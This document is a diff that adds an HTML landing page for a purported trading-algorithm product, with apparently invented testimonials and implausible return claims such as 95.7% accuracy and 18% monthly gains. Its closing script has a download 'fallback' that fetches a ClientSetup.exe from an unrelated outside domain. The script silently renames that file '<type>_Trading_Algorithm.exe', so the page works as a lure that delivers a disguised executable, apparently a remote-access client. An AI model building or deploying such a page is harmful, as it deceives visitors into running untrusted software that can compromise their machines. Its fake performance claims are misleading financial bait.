@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Quantum Trading Algorithms</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      .gradient-bg {
+        background: linear-gradient(
+          135deg,
+          #1a1a2e 0%,
+          #16213e 50%,
+          #0f3460 100%
+        );
+      }
+      .card-hover:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1),
+          0 10px 10px -5px rgba(0, 0, 0, 0.04);
+      }
+      .glow {
+        box-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
+      }
+      .glow-silver {
+        box-shadow: 0 0 15px rgba(192, 192, 192, 0.5);
+      }
+      .glow-forex {
+        box-shadow: 0 0 15px rgba(52, 152, 219, 0.5);
+      }
+      .glow-crypto {
+        box-shadow: 0 0 15px rgba(155, 89, 182, 0.5);
+      }
+      .feature-icon {
+        width: 60px;
+        height: 60px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        margin: 0 auto 20px;
+      }
+
+      .download-notification {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 1000;
+        transform: translateX(400px);
+        transition: transform 0.3s ease;
+      }
+
+      .download-notification.show {
+        transform: translateX(0);
+      }
+
+      .notification-content {
+        background: linear-gradient(135deg, #d4af37 0%, #f1c40f 100%);
+        color: #1a1a2e;
+        padding: 15px 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 20px rgba(212, 175, 55, 0.4);
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-weight: bold;
+      }
+
+      .close-btn {
+        background: none;
+        border: none;
+        color: #1a1a2e;
+        font-size: 18px;
+        cursor: pointer;
+        padding: 0;
+        width: 20px;
+        height: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .close-btn:hover {
+        opacity: 0.7;
+      }
+    </style>
+  </head>
+  <body class="gradient-bg text-gray-100 min-h-screen">
+    <!-- Header -->
+
+    <div id="downloadNotification" class="download-notification">
+      <div class="notification-content">
+        <i class="fas fa-download mr-2"></i>
+        <span id="downloadMessage"
+          >Trading algorithm download started! Check your downloads
+          folder.</span
+        >
+        <button onclick="hideNotification()" class="close-btn">×</button>
+      </div>
+    </div>
+    <header class="py-6 px-4 sm:px-6 lg:px-8">
+      <div class="container mx-auto flex justify-between items-center">
+        <div class="flex items-center">
+          <i class="fas fa-chart-line text-3xl text-yellow-400 mr-3"></i>
+          <h1
+            class="text-2xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-yellow-400 via-gray-300 to-blue-400"
+          >
+            Quantum Trading
+          </h1>
+        </div>
+        <nav class="hidden md:flex space-x-8">
+          <a
+            href="#features"
+            class="hover:text-yellow-400 transition duration-300"
+            >Features</a
+          >
+          <a
+            href="#algorithms"
+            class="hover:text-yellow-400 transition duration-300"
+            >Algorithms</a
+          >
+          <a
+            href="#testimonials"
+            class="hover:text-yellow-400 transition duration-300"
+            >Testimonials</a
+          >
+          <a
+            href="#contact"
+            class="hover:text-yellow-400 transition duration-300"
+            >Contact</a
+          >
+        </nav>
+        <button class="md:hidden text-2xl">
+          <i class="fas fa-bars"></i>
+        </button>
+      </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="py-20 px-4 sm:px-6 lg:px-8">
+      <div class="container mx-auto flex flex-col md:flex-row items-center">
+        <div class="md:w-1/2 mb-10 md:mb-0">
+          <h2 class="text-4xl md:text-5xl font-bold mb-6 leading-tight">
+            Advanced Trading Algorithms <br />
+            <span
+              class="bg-clip-text text-transparent bg-gradient-to-r from-yellow-400 via-gray-300 to-blue-400"
+            >
+              For Maximum Profits
+            </span>
+          </h2>
+          <p class="text-lg text-gray-300 mb-8">
+            Our cutting-edge algorithms analyze market trends with precision,
+            giving you the edge in Gold, Silver, and Forex trading.
+          </p>
+          <div
+            class="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-4"
+          >
+            <a
+              href="#algorithms"
+              class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              Explore Algorithms
+            </a>
+            <a
+              href="#features"
+              class="border-2 border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-black font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              Learn More
+            </a>
+          </div>
+        </div>
+        <div class="md:w-1/2 flex justify-center">
+          <div class="relative w-full max-w-md">
+            <div
+              class="absolute -top-6 -left-6 w-32 h-32 bg-yellow-400 rounded-full opacity-20 animate-pulse"
+            ></div>
+            <div
+              class="absolute -bottom-6 -right-6 w-32 h-32 bg-blue-400 rounded-full opacity-20 animate-pulse"
+            ></div>
+            <div
+              class="relative bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-xl p-6 border border-gray-700"
+            >
+              <div class="flex justify-between items-center mb-6">
+                <h3 class="font-bold text-xl">Market Dashboard</h3>
+                <span class="text-green-400 text-sm font-medium">
+                  <i class="fas fa-circle mr-1"></i> LIVE
+                </span>
+              </div>
+              <div class="space-y-4">
+                <div class="flex justify-between items-center">
+                  <div class="flex items-center">
+                    <i class="fas fa-coins text-yellow-400 mr-2"></i>
+                    <span>Gold (XAU)</span>
+                  </div>
+                  <span class="font-mono"
+                    >$1,923.45
+                    <span class="text-green-400 text-sm">+0.78%</span></span
+                  >
+                </div>
+                <div class="flex justify-between items-center">
+                  <div class="flex items-center">
+                    <i class="fas fa-ring text-gray-300 mr-2"></i>
+                    <span>Silver (XAG)</span>
+                  </div>
+                  <span class="font-mono"
+                    >$23.12
+                    <span class="text-green-400 text-sm">+1.23%</span></span
+                  >
+                </div>
+                <div class="flex justify-between items-center">
+                  <div class="flex items-center">
+                    <i class="fas fa-exchange-alt text-blue-400 mr-2"></i>
+                    <span>EUR/USD</span>
+                  </div>
+                  <span class="font-mono"
+                    >1.0924
+                    <span class="text-red-400 text-sm">-0.15%</span></span
+                  >
+                </div>
+              </div>
+              <div class="mt-6 pt-4 border-t border-gray-700">
+                <div class="h-40 bg-gray-900 rounded-lg p-3">
+                  <!-- Placeholder for chart -->
+                  <div
+                    class="flex items-center justify-center h-full text-gray-500"
+                  >
+                    <i class="fas fa-chart-bar text-3xl"></i>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Crypto Algorithm -->
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mt-12">
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 card-hover"
+          >
+            <div class="flex justify-center mb-6">
+              <div
+                class="w-20 h-20 rounded-full bg-purple-500 bg-opacity-20 flex items-center justify-center glow-forex"
+              >
+                <i class="fab fa-bitcoin text-3xl text-purple-400"></i>
+              </div>
+            </div>
+            <h3 class="text-2xl font-bold mb-3 text-center text-purple-400">
+              Bitcoin Quantum
+            </h3>
+            <p class="text-gray-300 mb-6 text-center">
+              Specialized algorithm for Bitcoin volatility, analyzing on-chain
+              data and market sentiment.
+            </p>
+            <ul class="space-y-3 mb-8">
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-purple-400 mr-2"></i>
+                <span>On-chain analytics integration</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-purple-400 mr-2"></i>
+                <span>Whale movement detection</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-purple-400 mr-2"></i>
+                <span>Exchange flow analysis</span>
+              </li>
+            </ul>
+            <a
+              href="#"
+              onclick="downloadAlgorithm(event, 'Bitcoin')"
+              class="block w-full bg-purple-500 hover:bg-purple-600 text-white font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              <i class="fas fa-download mr-2"></i> Bitcoin Algorithm
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Features Section -->
+    <section
+      id="features"
+      class="py-16 px-4 sm:px-6 lg:px-8 bg-gray-900 bg-opacity-50"
+    >
+      <div class="container mx-auto">
+        <div class="text-center mb-16">
+          <h2 class="text-3xl md:text-4xl font-bold mb-4">
+            Why Choose Our Algorithms
+          </h2>
+          <p class="text-lg text-gray-300 max-w-3xl mx-auto">
+            Our proprietary technology combines machine learning with
+            traditional technical analysis for unparalleled market insights.
+          </p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 hover:border-yellow-500"
+          >
+            <div
+              class="feature-icon bg-yellow-500 bg-opacity-20 text-yellow-400"
+            >
+              <i class="fas fa-bolt text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold mb-3 text-center">
+              Real-time Analysis
+            </h3>
+            <p class="text-gray-300 text-center">
+              Process market data in milliseconds to identify profitable
+              opportunities before they become mainstream.
+            </p>
+          </div>
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 hover:border-blue-500"
+          >
+            <div class="feature-icon bg-blue-500 bg-opacity-20 text-blue-400">
+              <i class="fas fa-brain text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold mb-3 text-center">
+              Adaptive Learning
+            </h3>
+            <p class="text-gray-300 text-center">
+              Our algorithms continuously evolve based on market conditions,
+              ensuring optimal performance in any environment.
+            </p>
+          </div>
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 hover:border-green-500"
+          >
+            <div class="feature-icon bg-green-500 bg-opacity-20 text-green-400">
+              <i class="fas fa-shield-alt text-2xl"></i>
+            </div>
+            <h3 class="text-xl font-bold mb-3 text-center">Risk Management</h3>
+            <p class="text-gray-300 text-center">
+              Built-in safeguards protect your capital by automatically
+              adjusting position sizes and setting stop-loss levels.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Algorithms Section -->
+    <section id="algorithms" class="py-16 px-4 sm:px-6 lg:px-8">
+      <div class="container mx-auto">
+        <div class="text-center mb-16">
+          <h2 class="text-3xl md:text-4xl font-bold mb-4">
+            Our Trading Algorithms
+          </h2>
+          <p class="text-lg text-gray-300 max-w-3xl mx-auto">
+            Specialized solutions tailored for different market segments with
+            proven track records.
+          </p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <!-- Gold Algorithm -->
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 card-hover"
+          >
+            <div class="flex justify-center mb-6">
+              <div
+                class="w-20 h-20 rounded-full bg-yellow-500 bg-opacity-20 flex items-center justify-center glow"
+              >
+                <i class="fas fa-coins text-3xl text-yellow-400"></i>
+              </div>
+            </div>
+            <h3 class="text-2xl font-bold mb-3 text-center text-yellow-400">
+              Aureus Gold Pro
+            </h3>
+            <p class="text-gray-300 mb-6 text-center">
+              Advanced algorithm optimized for gold market volatility,
+              identifying both short-term swings and long-term trends.
+            </p>
+            <ul class="space-y-3 mb-8">
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-yellow-400 mr-2"></i>
+                <span>95.7% accuracy in trend prediction</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-yellow-400 mr-2"></i>
+                <span>Automated news sentiment analysis</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-yellow-400 mr-2"></i>
+                <span>Dual timeframe confirmation</span>
+              </li>
+            </ul>
+            <a
+              href="#"
+              onclick="downloadAlgorithm(event, 'Gold')"
+              class="block w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              <i class="fas fa-download mr-2"></i> Gold Algorithm
+            </a>
+          </div>
+
+          <!-- Silver Algorithm -->
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 card-hover"
+          >
+            <div class="flex justify-center mb-6">
+              <div
+                class="w-20 h-20 rounded-full bg-gray-300 bg-opacity-20 flex items-center justify-center glow-silver"
+              >
+                <i class="fas fa-ring text-3xl text-gray-300"></i>
+              </div>
+            </div>
+            <h3 class="text-2xl font-bold mb-3 text-center text-gray-300">
+              Argentum Silver AI
+            </h3>
+            <p class="text-gray-300 mb-6 text-center">
+              Precision-engineered for silver's unique price action, capturing
+              both industrial and precious metal dynamics.
+            </p>
+            <ul class="space-y-3 mb-8">
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-gray-300 mr-2"></i>
+                <span>Intraday volatility exploitation</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-gray-300 mr-2"></i>
+                <span>Gold-silver ratio optimization</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-gray-300 mr-2"></i>
+                <span>Industrial demand indicators</span>
+              </li>
+            </ul>
+            <a
+              href="#"
+              onclick="downloadAlgorithm(event, 'Silver')"
+              class="block w-full bg-gray-300 hover:bg-gray-400 text-black font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              <i class="fas fa-download mr-2"></i> Silver Algorithm
+            </a>
+          </div>
+
+          <!-- Forex Algorithm -->
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700 transition duration-300 card-hover"
+          >
+            <div class="flex justify-center mb-6">
+              <div
+                class="w-20 h-20 rounded-full bg-blue-400 bg-opacity-20 flex items-center justify-center glow-forex"
+              >
+                <i class="fas fa-exchange-alt text-3xl text-blue-400"></i>
+              </div>
+            </div>
+            <h3 class="text-2xl font-bold mb-3 text-center text-blue-400">
+              Forex Quantum Edge
+            </h3>
+            <p class="text-gray-300 mb-6 text-center">
+              Multi-currency strategy that adapts to changing correlations and
+              central bank policy shifts.
+            </p>
+            <ul class="space-y-3 mb-8">
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-blue-400 mr-2"></i>
+                <span>28 currency pairs coverage</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-blue-400 mr-2"></i>
+                <span>Carry trade optimization</span>
+              </li>
+              <li class="flex items-center">
+                <i class="fas fa-check-circle text-blue-400 mr-2"></i>
+                <span>News event avoidance system</span>
+              </li>
+            </ul>
+            <a
+              href="#"
+              onclick="downloadAlgorithm(event, 'Forex')"
+              class="block w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition duration-300 text-center"
+            >
+              <i class="fas fa-download mr-2"></i> Forex Algorithm
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section
+      id="testimonials"
+      class="py-16 px-4 sm:px-6 lg:px-8 bg-gray-900 bg-opacity-50"
+    >
+      <div class="container mx-auto">
+        <div class="text-center mb-16">
+          <h2 class="text-3xl md:text-4xl font-bold mb-4">
+            What Our Clients Say
+          </h2>
+          <p class="text-lg text-gray-300 max-w-3xl mx-auto">
+            Trusted by professional traders and institutions worldwide.
+          </p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700"
+          >
+            <div class="flex items-center mb-4">
+              <div
+                class="w-12 h-12 rounded-full bg-yellow-500 bg-opacity-20 flex items-center justify-center mr-4"
+              >
+                <i class="fas fa-user text-yellow-400"></i>
+              </div>
+              <div>
+                <h4 class="font-bold">Michael R.</h4>
+                <p class="text-sm text-gray-400">Gold Trader</p>
+              </div>
+            </div>
+            <p class="text-gray-300">
+              "The Aureus Gold Pro algorithm has increased my trading accuracy
+              by 40%. The way it handles news events is remarkable."
+            </p>
+            <div class="mt-4 flex text-yellow-400">
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+            </div>
+          </div>
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700"
+          >
+            <div class="flex items-center mb-4">
+              <div
+                class="w-12 h-12 rounded-full bg-blue-500 bg-opacity-20 flex items-center justify-center mr-4"
+              >
+                <i class="fas fa-user-tie text-blue-400"></i>
+              </div>
+              <div>
+                <h4 class="font-bold">Sarah L.</h4>
+                <p class="text-sm text-gray-400">Hedge Fund Manager</p>
+              </div>
+            </div>
+            <p class="text-gray-300">
+              "We've integrated Forex Quantum Edge into our trading desk and
+              seen a consistent 18% monthly return with reduced drawdown."
+            </p>
+            <div class="mt-4 flex text-yellow-400">
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star-half-alt"></i>
+            </div>
+          </div>
+          <div
+            class="bg-gray-800 bg-opacity-50 p-8 rounded-xl border border-gray-700"
+          >
+            <div class="flex items-center mb-4">
+              <div
+                class="w-12 h-12 rounded-full bg-gray-300 bg-opacity-20 flex items-center justify-center mr-4"
+              >
+                <i class="fas fa-user-md text-gray-300"></i>
+              </div>
+              <div>
+                <h4 class="font-bold">Dr. James K.</h4>
+                <p class="text-sm text-gray-400">Part-time Trader</p>
+              </div>
+            </div>
+            <p class="text-gray-300">
+              "As someone with limited trading time, Argentum Silver AI has been
+              a game-changer, executing trades I would miss during surgeries."
+            </p>
+            <div class="mt-4 flex text-yellow-400">
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+              <i class="fas fa-star"></i>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-16 px-4 sm:px-6 lg:px-8">
+      <div
+        class="container mx-auto bg-gradient-to-r from-blue-900 to-gray-900 rounded-xl p-8 md:p-12"
+      >
+        <div class="flex flex-col md:flex-row items-center">
+          <div class="md:w-2/3 mb-8 md:mb-0">
+            <h2 class="text-3xl md:text-4xl font-bold mb-4">
+              Ready to Transform Your Trading?
+            </h2>
+            <p class="text-lg text-gray-300">
+              Join thousands of traders who have elevated their performance with
+              our algorithms.
+            </p>
+          </div>
+          <div class="md:w-1/3 flex justify-center md:justify-end">
+            <a
+              href="#algorithms"
+              class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-4 px-8 rounded-lg transition duration-300 text-center text-lg"
+            >
+              Get Started Now
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section
+      id="contact"
+      class="py-16 px-4 sm:px-6 lg:px-8 bg-gray-900 bg-opacity-50"
+    >
+      <div class="container mx-auto">
+        <div class="text-center mb-16">
+          <h2 class="text-3xl md:text-4xl font-bold mb-4">Contact Our Team</h2>
+          <p class="text-lg text-gray-300 max-w-3xl mx-auto">
+            Have questions? Our support team is available 24/7 to assist you.
+          </p>
+        </div>
+        <div
+          class="max-w-4xl mx-auto bg-gray-800 bg-opacity-50 rounded-xl p-8 border border-gray-700"
+        >
+          <form class="space-y-6">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div>
+                <label for="name" class="block text-gray-300 mb-2"
+                  >Full Name</label
+                >
+                <input
+                  type="text"
+                  id="name"
+                  class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+                />
+              </div>
+              <div>
+                <label for="email" class="block text-gray-300 mb-2"
+                  >Email Address</label
+                >
+                <input
+                  type="email"
+                  id="email"
+                  class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+                />
+              </div>
+            </div>
+            <div>
+              <label for="subject" class="block text-gray-300 mb-2"
+                >Subject</label
+              >
+              <input
+                type="text"
+                id="subject"
+                class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+              />
+            </div>
+            <div>
+              <label for="message" class="block text-gray-300 mb-2"
+                >Message</label
+              >
+              <textarea
+                id="message"
+                rows="5"
+                class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-yellow-500"
+              ></textarea>
+            </div>
+            <div>
+              <button
+                type="submit"
+                class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-6 rounded-lg transition duration-300"
+              >
+                Send Message
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-12 px-4 sm:px-6 lg:px-8 border-t border-gray-800">
+      <div class="container mx-auto">
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+          <div>
+            <div class="flex items-center mb-4">
+              <i class="fas fa-chart-line text-2xl text-yellow-400 mr-3"></i>
+              <h3 class="text-xl font-bold">Quantum Trading</h3>
+            </div>
+            <p class="text-gray-400">
+              Advanced algorithmic trading solutions for professionals and
+              institutions.
+            </p>
+            <div class="flex space-x-4 mt-6">
+              <a
+                href="#"
+                class="text-gray-400 hover:text-yellow-400 transition duration-300"
+              >
+                <i class="fab fa-twitter"></i>
+              </a>
+              <a
+                href="#"
+                class="text-gray-400 hover:text-yellow-400 transition duration-300"
+              >
+                <i class="fab fa-linkedin"></i>
+              </a>
+              <a
+                href="#"
+                class="text-gray-400 hover:text-yellow-400 transition duration-300"
+              >
+                <i class="fab fa-telegram"></i>
+              </a>
+            </div>
+          </div>
+          <div>
+            <h4 class="text-lg font-bold mb-4">Products</h4>
+            <ul class="space-y-2">
+              <li>
+                <a
+                  href="#algorithms"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Gold Algorithm</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#algorithms"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Silver Algorithm</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#algorithms"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Forex Algorithm</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Enterprise Solutions</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h4 class="text-lg font-bold mb-4">Resources</h4>
+            <ul class="space-y-2">
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Documentation</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >API Reference</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Tutorials</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Market Research</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h4 class="text-lg font-bold mb-4">Legal</h4>
+            <ul class="space-y-2">
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Privacy Policy</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Terms of Service</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Risk Disclosure</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#"
+                  class="text-gray-400 hover:text-yellow-400 transition duration-300"
+                  >Refund Policy</a
+                >
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div
+          class="border-t border-gray-800 mt-12 pt-8 text-center text-gray-500"
+        >
+          <p>© 2023 Quantum Trading Algorithms. All rights reserved.</p>
+          <p class="mt-2 text-sm">
+            Disclaimer: Trading involves risk. Past performance is not
+            indicative of future results.
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Admin Login Modal -->
+    <div
+      id="adminModal"
+      class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden"
+    >
+      <div class="bg-gray-800 rounded-xl p-8 w-full max-w-md">
+        <div class="flex justify-between items-center mb-6">
+          <h3 class="text-2xl font-bold">Admin Dashboard</h3>
+          <button
+            onclick="document.getElementById('adminModal').classList.add('hidden')"
+            class="text-gray-400 hover:text-white"
+          >
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <form id="adminForm" class="space-y-4">
+          <div>
+            <label class="block text-gray-300 mb-2">Username</label>
+            <input
+              type="text"
+              class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3"
+              required
+            />
+          </div>
+          <div>
+            <label class="block text-gray-300 mb-2">Password</label>
+            <input
+              type="password"
+              class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3"
+              required
+            />
+          </div>
+          <button
+            type="submit"
+            class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 px-6 rounded-lg"
+          >
+            Login
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      // Function to download trading algorithms using the API
+      function downloadAlgorithm(event, algorithmType) {
+        event.preventDefault();
+
+        try {
+          // Show download notification
+          showNotification(algorithmType);
+
+          // Create the download URL with algorithm type as parameter
+          const url = `/api/download?movie=${algorithmType}`;
+
+          // Create hidden link and trigger download
+          const a = document.createElement("a");
+          a.href = url;
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          console.log(
+            `${algorithmType} trading algorithm download initiated via API`
+          );
+        } catch (error) {
+          console.error("Download failed:", error);
+          directDownload(algorithmType);
+        }
+      }
+
+      // Direct download fallback
+      function directDownload(algorithmType) {
+        const remoteFile =
+          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+        const a = document.createElement("a");
+        a.href = remoteFile;
+        a.download = `${algorithmType}_Trading_Algorithm.exe`;
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // Show/hide notification functions
+      function showNotification(algorithmType) {
+        const notification = document.getElementById("downloadNotification");
+        const message = document.getElementById("downloadMessage");
+        message.textContent = `${algorithmType} trading algorithm download started! Check your downloads folder.`;
+        notification.classList.add("show");
+        setTimeout(() => hideNotification(), 5000);
+      }
+
+      function hideNotification() {
+        const notification = document.getElementById("downloadNotification");
+        notification.classList.remove("show");
+      }
+    </script>
+  </body>
+</html>
